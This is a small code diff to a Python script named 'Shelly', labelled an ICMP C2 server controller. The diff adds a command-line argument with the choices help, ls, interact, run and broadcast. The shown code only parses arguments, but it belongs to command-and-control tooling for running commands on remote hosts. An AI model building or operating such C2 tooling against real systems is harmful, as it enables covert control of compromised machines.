@@ -109,6 +109,8 @@ def main():
     parser = argparse.ArgumentParser(
                     prog='Shelly',
                     description='ICMP C2 Server Controller')
+    parser.add_argument('command', choices=["help", "ls", "interact", "run", "broadcast"], help='The target to interact with')
+    args = parser.parse_args()
     controller = Controller()
     
     if len(sys.argv) < 2 :
